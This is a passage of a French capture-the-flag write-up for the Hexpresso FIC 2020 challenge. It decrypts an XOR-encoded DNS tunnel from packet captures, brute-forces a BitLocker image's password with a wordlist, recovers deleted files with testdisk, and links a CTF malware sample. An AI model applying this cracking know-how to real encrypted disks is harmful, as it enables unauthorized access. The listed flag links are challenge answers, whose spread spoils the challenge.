+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>aes</span> <span class=o>=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>l</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>^</span> <span class=n>key</span>
+</span></span></code></pre></td></tr></table></div></div><p>On remarque aussi que la clef est transmise en claire avec les données chiffrées dans la fonction &ldquo;encrypt&rdquo; grâce à la ligne suivante:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>key</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Cette clef est le premier octet envoyé lors d&rsquo;une communication en utilisant ce tunnel DNS maison.</p><h3 id=ii2-fonction-de-déchiffrement>II.2. Fonction de déchiffrement</h3><p>Il nous suffit maintenant de créer un script qui va prendre le premier octet de données comme clef et qui va nous permettre de déchiffrer le contenu du tunnel DNS comme ci-dessous:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;dns.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index_str</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>length</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>pos</span> <span class=o>=</span> <span class=n>length</span> <span class=o>+</span> <span class=n>index</span>
+</span></span><span class=line><span class=cl>    <span class=n>index_str</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>2</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>index_str</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span> <span class=o>^</span> <span class=n>key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>index_str</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>text</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span> <span class=o>+</span> <span class=mi>2</span><span class=o>*</span><span class=p>(</span><span class=n>pos</span><span class=o>-</span><span class=n>index</span><span class=p>)</span> <span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>x</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>text</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span> <span class=o>^</span> <span class=n>key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>length</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>text</span><span class=p>)</span> <span class=o>+</span><span class=n>pos</span> <span class=o>-</span> <span class=n>index</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>text</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=ii3-extraction-des-sous-domaines>II.3. Extraction des sous domaines</h3><p>Une fois cette fonction réalisée, il nous fait extraire tous les sous domaines présents dans le pcap contenant les données chiffrées.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_265b42607a2fef97df3c6baa31bb5efd.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_265b42607a2fef97df3c6baa31bb5efd.png, /lib/images/writeups/2020_hexpresso_fic/upload_265b42607a2fef97df3c6baa31bb5efd.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_265b42607a2fef97df3c6baa31bb5efd.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_265b42607a2fef97df3c6baa31bb5efd.png title=/lib/images/writeups/2020_hexpresso_fic/upload_265b42607a2fef97df3c6baa31bb5efd.png></p><p>Pour cela on va utiliser l&rsquo;outil tshark en lui donnant les filtres adéquates.</p><blockquote><p>tshark -r cb52ae4d15503c598f0bb42b8af1ce51.pcap -Y &lsquo;dns.qry.name && ip.src == 172.16.42.99&rsquo; -Tfields -e &ldquo;dns.qry.name&rdquo; |sed &rsquo;s/.local.tux//g&rsquo;</p></blockquote><p>Cette commande va nous permettre d&rsquo;extraire les informations utiles pour la résolution de cette étape:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0000   :   a191919191e2cecfc6d3c0d5d4cdc0d5c8cecfd2808081f8
+</span></span><span class=line><span class=cl>0001   :   a696969797cfc9c8d5878786ffc9d386c2cfc286cfd286d5c986c0
+</span></span><span class=line><span class=cl>0002   :   88b8b8bab8fda8ece1eca8e1fca8fbe7a8eee9faa98282c0edfaeda8e1fba8
+</span></span><span class=line><span class=cl>0003   :   1929292a2976397f786b381313517c6b7c39706a396d
+</span></span><span class=line><span class=cl>0004   :   cafafaf9f3afb8afeaa3b9eabea2afeaa6a3a4a1ea
+</span></span><span class=line><span class=cl>0005   :   edddddd9d4cd81848386cd8483cd8f8c9e
+</span></span><span class=line><span class=cl>0006   :   6b5b5b5e520a180e58594b0d0419
+</span></span><span class=line><span class=cl>0007   :   4f7f7f797b6f29203d227545010d7d07067b0b1b070617
+</span></span><span class=line><span class=cl>0008   :   ae9e9e999fe0ec9ce6e79aeafae6e7f6fd98f79dfbe3f7f6e9ff
+</span></span><span class=line><span class=cl>0009   :   9cacacababd8c8d4d5c4cfaac5afc9d1c5c4dbcdc6d0c5
+</span></span><span class=line><span class=cl>0010   :   6c5c5c545d343f5a355f392135342b3d362035
+</span></span><span class=line><span class=cl>0011   :   6f5f5f575a5c3a223637283e352336
+</span></span><span class=line><span class=cl>0012   :   e4d4d4ddd6bea8bdaba6bea3
+</span></span><span class=line><span class=cl>0013   :   d7e7e7eee08d909ce3e48399e38f909ae3
+</span></span><span class=line><span class=cl>0014   :   73434243403d472b343e47212334264027203c37373e3641373c
+</span></span><span class=line><span class=cl>0015   :   daeaebebe88fe98e89959e9e979fe89e95809e989794898e9183
+</span></span><span class=line><span class=cl>0016   :   4272737070060d1806000f0c1116091b18140f177105
+</span></span><span class=line><span class=cl>0017   :   36060704017b7865627d6f6c607b6305717f7b6c60717f02623c7b797c
+</span></span><span class=line><span class=cl>0018   :   9cacadafabafdbd5d1c6cadbd5a8c896d1d3d6cdd1
+</span></span><span class=line><span class=cl>0019   :   54646560650e02131d60005e191b1e051919601019190e0013606605016969
+</span></span><span class=line><span class=cl>0020   :   25151410176868116168687f716211177470181818
+</span></span><span class=line><span class=cl>0021   :   f7c7c6c2cea3b0c3c5a6a2cacacafdfdd7a8d7d7d7d7
+</span></span><span class=line><span class=cl>0022   :   7b4b4a4d482a2e46464671715b245b5b5b5b5b5b
+</span></span><span class=line><span class=cl>0023   :   95a5a4a3ad9f9fb5cab5b5b5b5b5b5b5b5b5b5b5b5b5
+</span></span><span class=line><span class=cl>0024   :   d8e8e9efe1f8f8f8f8f8f8f8f8
+</span></span><span class=line><span class=cl>0025   :   d6e6e7eee5f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6
+</span></span><span class=line><span class=cl>0026   :   0f3f3e37362f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f
+</span></span><span class=line><span class=cl>0027   :   eededfd7d8cecececececececececece
+</span></span><span class=line><span class=cl>0028   :   56666466637676767676767676767676765c2a
+</span></span><span class=line><span class=cl>0029   :   7d4d4f4c4e5d5d5d5d77015d0122225d5d5d22
+</span></span><span class=line><span class=cl>0030   :   94a4a6a6a0b4b4cbcbcbcbcbb4b4cbcbcbb4cb
+</span></span><span class=line><span class=cl>0031   :   7c4c4e4e442323235c5c2323235c23235c
+</span></span><span class=line><span class=cl>0032   :   b585878680ea95eaea9595ea95eaea
+</span></span><span class=line><span class=cl>0033   :   facac8cec9a5a5daa5a5a5dadaa5a5a5daa5a5a5dadaa5
+</span></span><span class=line><span class=cl>0034   :   10202225234f304f4f4f30304f4f4f
+</span></span><span class=line><span class=cl>0035   :   daeae8eceb8585fafad0a6
+</span></span><span class=line><span class=cl>0036   :   75454743407f0955522a5529555a552a55295529
+</span></span><span class=line><span class=cl>0037   :   6656545155494639463a463a494649464139463a1a464139
+</span></span><span class=line><span class=cl>0038   :   4e7e7c767d6e69116e12326e691111616e
+</span></span><span class=line><span class=cl>0039   :   5f6f6d6767237f780000707f007f03707f0000707f0000
+</span></span><span class=line><span class=cl>0040   :   eddddfd4d5c2cdb2b2c2cdb2b291c2
+</span></span><span class=line><span class=cl>0041   :   e7d7d4d7d4c7b8b89bc8c7b8c7bbc7ed9bc79bc79bc79bc7c7b8b8c8
+</span></span><span class=line><span class=cl>0042   :   88b8bbb9b8a8d4a882f4a8f4a8f4a8f4a8a8d7d7a7b6a8a8b4f4a8f4
+</span></span><span class=line><span class=cl>0043   :   83b3b0b1b3ffa3a3dcdcacbda3a3bfffa3ff
+</span></span><span class=line><span class=cl>0044   :   48787b7a70687434683417616834683468346868
+</span></span><span class=line><span class=cl>0045   :   cdfdfefefe92e4edb1edb1edb1eded9292e2919292ed9192
+</span></span><span class=line><span class=cl>0046   :   eededddadcceb1b1c1b2b1b1ceb2b1b1ceb2cec6b1c7ce92e492b192ce
+</span></span><span class=line><span class=cl>0047   :   b38380868093ef939bec9a93cfb9cfeccf93cfeccfef
+</span></span><span class=line><span class=cl>0048   :   c2f2f1f4f0be9dbee2be9dbe9e9d9d9ded9ded9e9d9ee2ec9d
+</span></span><span class=line><span class=cl>0049   :   28181b1f197777077707747774080677770754775408087477777754547777
+</span></span><span class=line><span class=cl>0050   :   80b0b3b8b2dfaffcdffca0a0dcdfdfdffcfcdfdfdfaf
+</span></span><span class=line><span class=cl>0051   :   3b0b0803026764646447476464641464
+</span></span><span class=line><span class=cl>0052   :   93a3a0aaa4ccbcccccccbccfccccccbcb399b3b3b3b3b3b3
+</span></span><span class=line><span class=cl>0053   :   41717571701e6e1d1e1e1e6e614b6161616161616161616161
+</span></span><span class=line><span class=cl>0054   :   28181c18112208080808080808
+</span></span><span class=line><span class=cl>0055   :   ddede9eceefdfdfdfdfdfdfdfdfdfdfdfdfda1
+</span></span><span class=line><span class=cl>0056   :   d3e3e7e1e7f3f3af8caff3f3f3f3f3f3f3f3f3f3
+</span></span><span class=line><span class=cl>0057   :   97a7a3a4a6b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7
+</span></span><span class=line><span class=cl>0058   :   f2c2c6c1c7d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2
+</span></span><span class=line><span class=cl>0059   :   340400000714141414141414141414141414143e3e3e
+</span></span><span class=line><span class=cl>0060   :   9fafababa8bfbfbfbfbfbfbfbfbfbf959595
+</span></span><span class=line><span class=cl>0061   :   6555515056454545456f6f6f
+</span></span><span class=line><span class=cl>0062   :   84b4b0b1bd8e
+</span></span></code></pre></td></tr></table></div></div><h3 id=ii4-flag>II.4. Flag</h3><p>Une fois l&rsquo;extraction faite, il nous suffit de déchiffrer la sortie de la commande tshark grâce à la fonction de déchiffrement mise en place en II.2:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Congratulations!! You did it so far!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Here is the link in base32 form:
+</span></span><span class=line><span class=cl>NB2HI4DTHIXS6Y3UMYXGQZLYSODDME2DOZDBMNSTKYZVMU3GIMZVGI4T
+</span></span><span class=line><span class=cl>MOJQMM4DMMZTG42QU===
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>_
+</span></span><span class=line><span class=cl>| |__ _____ ___ __ _ __ ___ ___ ___ ___
+</span></span><span class=line><span class=cl>| &#39;_ \ / _ \ / / &#39;_ | &#39;/ _ / / |/ _ \
+</span></span><span class=line><span class=cl>| | | | /&gt; &lt;| | \ () |
+</span></span><span class=line><span class=cl>|| |_|_/_/_\ ./|_| _||___/_/_/
+</span></span></code></pre></td></tr></table></div></div><p>Le lien décodé nous donne accès à l&rsquo;étape 3:</p><blockquote><p><a href=https://ctf.hexpresso.fr/5798ca47dace5c5e6d3529690c863375 target=_blank rel="noopener noreffer">https://ctf.hexpresso.fr/5798ca47dace5c5e6d3529690c863375</a></p></blockquote><h2 id=iii-step-3---do-your-forensic-analyst-job>III. Step 3 - Do your Forensic ANALyst job</h2><table><thead><tr><th>Event</th><th>Challenge</th><th>Category</th><th>Solves</th></tr></thead><tbody><tr><td>CatureTheFic</td><td>Step 3</td><td>Forensic</td><td>347</td></tr></tbody></table><h3 id=iii1-etat-de-lart>III.1. Etat de l&rsquo;art</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_b58f4ad246da510b8b98c29204ede676.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_b58f4ad246da510b8b98c29204ede676.png, /lib/images/writeups/2020_hexpresso_fic/upload_b58f4ad246da510b8b98c29204ede676.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_b58f4ad246da510b8b98c29204ede676.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_b58f4ad246da510b8b98c29204ede676.png title=/lib/images/writeups/2020_hexpresso_fic/upload_b58f4ad246da510b8b98c29204ede676.png></p><p>Le fichier utilisé pour cette épreuve est un dump de disque:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_ad45fa68221c1bfc0cc145a8050f3e02.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_ad45fa68221c1bfc0cc145a8050f3e02.png, /lib/images/writeups/2020_hexpresso_fic/upload_ad45fa68221c1bfc0cc145a8050f3e02.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_ad45fa68221c1bfc0cc145a8050f3e02.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_ad45fa68221c1bfc0cc145a8050f3e02.png title=/lib/images/writeups/2020_hexpresso_fic/upload_ad45fa68221c1bfc0cc145a8050f3e02.png></p><p>La première chose à faire de voir les différentes partitions disponibles dans ce fichier:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_1881eedbeba7dc96fb578a6fd2ee1364.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_1881eedbeba7dc96fb578a6fd2ee1364.png, /lib/images/writeups/2020_hexpresso_fic/upload_1881eedbeba7dc96fb578a6fd2ee1364.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_1881eedbeba7dc96fb578a6fd2ee1364.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_1881eedbeba7dc96fb578a6fd2ee1364.png title=/lib/images/writeups/2020_hexpresso_fic/upload_1881eedbeba7dc96fb578a6fd2ee1364.png></p><p>On voit différentes partitions, dont une partition NTFS qui peut nous intéresser à l&rsquo;offset <code>512*128</code>, soit la taille d&rsquo;un secteur multiplié par l&rsquo;offset de début de la partition.</p><p>Sur la première image, il est possible de voir des erreurs dans l&rsquo;output de la commande &ldquo;file&rdquo;. Il s&rsquo;agit peut-être d&rsquo;une partition endommagée ou chiffrée&mldr; Pour en être sûr, regardons les premiers octets de la partition NTFS:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_0c8e34cceee82b95a848f76ed6d1636b.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_0c8e34cceee82b95a848f76ed6d1636b.png, /lib/images/writeups/2020_hexpresso_fic/upload_0c8e34cceee82b95a848f76ed6d1636b.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_0c8e34cceee82b95a848f76ed6d1636b.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_0c8e34cceee82b95a848f76ed6d1636b.png title=/lib/images/writeups/2020_hexpresso_fic/upload_0c8e34cceee82b95a848f76ed6d1636b.png></p><p>L&rsquo;en-tête &ldquo;-FVE-FS-&rdquo; signifie que nous sommes en présence d&rsquo;un volume bitlocker.</p><h3 id=iii2-trouver-la-clé>III.2. Trouver la clé</h3><p>Pour déchiffrer un volume bitlocker, il existe plusieurs façons:</p><ol><li>Connaitre le mot de passe de l&rsquo;utilisateur</li><li>Récupérer la clé dans un dump mémoire</li><li>Avoir la clé de récupération bitlocker</li></ol><p>Dans notre cas, c&rsquo;est forcément avec le mot de passe utilisateur. Ne le connaissant pas, il reste 2 possibilitées:</p><ol><li>Bruteforcer le mot de passe</li><li>Deviner le mot de passe</li></ol><p>Etant un bourrin dans l&rsquo;âme, cet article m&rsquo;a aidé: <a href=https://medium.com/adamantsec/write-up-of-bsideslisbon-ctf-df479bff8b7d target=_blank rel="noopener noreffer">https://medium.com/adamantsec/write-up-of-bsideslisbon-ctf-df479bff8b7d</a></p><p>Connaissant un peu Hexpresso, je me suis dis que ça ne serait pas du guessing avec un quelque chose d&rsquo;exotique, donc j&rsquo;ai tenté de lancer un rockyou:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_de9c5345e5faef9556b201ea069932f8.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_de9c5345e5faef9556b201ea069932f8.png, /lib/images/writeups/2020_hexpresso_fic/upload_de9c5345e5faef9556b201ea069932f8.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_de9c5345e5faef9556b201ea069932f8.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_de9c5345e5faef9556b201ea069932f8.png title=/lib/images/writeups/2020_hexpresso_fic/upload_de9c5345e5faef9556b201ea069932f8.png></p><p>Le mot de passe bitlocker est donc: <code>password</code>.</p><p>Il ne reste qu&rsquo;à monter le volume:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_f4d171a63bb28d195c6850ecab742ebd.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_f4d171a63bb28d195c6850ecab742ebd.png, /lib/images/writeups/2020_hexpresso_fic/upload_f4d171a63bb28d195c6850ecab742ebd.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_f4d171a63bb28d195c6850ecab742ebd.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_f4d171a63bb28d195c6850ecab742ebd.png title=/lib/images/writeups/2020_hexpresso_fic/upload_f4d171a63bb28d195c6850ecab742ebd.png></p><h3 id=iii3-récupérer-les-fichiers-supprimés>III.3. Récupérer les fichiers supprimés</h3><p>En déchiffrant le volume bitlocker avec <code>dislocker</code>, puis en montant le volume déchiffré, on se rend rapidement compte qu&rsquo;il n&rsquo;y a pas de flag, mais seulement un petit message de la part de l&rsquo;auteur du challenge.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_63f8056849b69eb15bfcdf10a6d7da75.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_63f8056849b69eb15bfcdf10a6d7da75.png, /lib/images/writeups/2020_hexpresso_fic/upload_63f8056849b69eb15bfcdf10a6d7da75.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_63f8056849b69eb15bfcdf10a6d7da75.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_63f8056849b69eb15bfcdf10a6d7da75.png title=/lib/images/writeups/2020_hexpresso_fic/upload_63f8056849b69eb15bfcdf10a6d7da75.png></p><p>Dans ma méthodologie d&rsquo;analyse, la première chose à faire avec un dump de disque est d&rsquo;inspecter le disque avec <code>testdisk</code>, à la recherche de fichiers supprimés.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ testdisk dislocker-file
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Proceed &gt; None &gt; Advanced &gt; Undelete
+</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_2d0c712c570060a2b9ccab08390e52dc.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_2d0c712c570060a2b9ccab08390e52dc.png, /lib/images/writeups/2020_hexpresso_fic/upload_2d0c712c570060a2b9ccab08390e52dc.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_2d0c712c570060a2b9ccab08390e52dc.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_2d0c712c570060a2b9ccab08390e52dc.png title=/lib/images/writeups/2020_hexpresso_fic/upload_2d0c712c570060a2b9ccab08390e52dc.png></p><p>Le fichier <code>fic.zip</code> présage plein de bonnes choses. Un coup de &ldquo;c c&rdquo; et &ldquo;q q q q&rdquo; dans testdisk, et voilà le zip récupéré.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_efdd62191529cbd67b8b3e102935f813.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_efdd62191529cbd67b8b3e102935f813.png, /lib/images/writeups/2020_hexpresso_fic/upload_efdd62191529cbd67b8b3e102935f813.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_efdd62191529cbd67b8b3e102935f813.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_efdd62191529cbd67b8b3e102935f813.png title=/lib/images/writeups/2020_hexpresso_fic/upload_efdd62191529cbd67b8b3e102935f813.png></p><p>Finalement, l&rsquo;archive zip nous renvoie vers un gist:</p><blockquote><p><a href=https://gist.github.com/bosal43833/3e815abc3f92e45963a8aafc8acfe411 target=_blank rel="noopener noreffer">https://gist.github.com/bosal43833/3e815abc3f92e45963a8aafc8acfe411</a></p></blockquote><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_6c4ce8e15e98609c85123834d2d45f0a.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_6c4ce8e15e98609c85123834d2d45f0a.png, /lib/images/writeups/2020_hexpresso_fic/upload_6c4ce8e15e98609c85123834d2d45f0a.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_6c4ce8e15e98609c85123834d2d45f0a.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_6c4ce8e15e98609c85123834d2d45f0a.png title=/lib/images/writeups/2020_hexpresso_fic/upload_6c4ce8e15e98609c85123834d2d45f0a.png></p><h3 id=iii4-flag>III.4. Flag</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> -n <span class=s1>&#39;aHR0cHM6Ly9jdGYuaGV4cHJlc3NvLmZyLzFlYTk2N2Y1MmQxYWFiMzI3ZDA4NGVmZDI0ZDA0OTU3Cg==&#39;</span> <span class=p>|</span>base64 -d
+</span></span><span class=line><span class=cl>https://ctf.hexpresso.fr/1ea967f52d1aab327d084efd24d04957
+</span></span></code></pre></td></tr></table></div></div><h2 id=iv-step-4---wannacry-is-fcking-back>IV. Step 4 - Wannacry is f*cking back</h2><table><thead><tr><th>Event</th><th>Challenge</th><th>Category</th><th>Solves</th></tr></thead><tbody><tr><td>CatureTheFic</td><td>Step 4</td><td>Reverse / Crypto</td><td>244</td></tr></tbody></table><h3 id=iv1-etat-de-lart>IV.1. Etat de l&rsquo;art</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_d232c694fb4034546cfee644f22aada4.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_d232c694fb4034546cfee644f22aada4.png, /lib/images/writeups/2020_hexpresso_fic/upload_d232c694fb4034546cfee644f22aada4.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_d232c694fb4034546cfee644f22aada4.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_d232c694fb4034546cfee644f22aada4.png title=/lib/images/writeups/2020_hexpresso_fic/upload_d232c694fb4034546cfee644f22aada4.png></p><blockquote><p>Le malware est disponible à l&rsquo;adresse suivante : <a href=https://ctf.hexpresso.fr/5c09555ef0576e6cee46a9ee7a841c8b.zip target=_blank rel="noopener noreffer">https://ctf.hexpresso.fr/5c09555ef0576e6cee46a9ee7a841c8b.zip</a></p></blockquote><p>Cette épreuve commence donc avec deux fichiers :</p><div class=highlight><div class=chroma><table class=lntable><tr><td 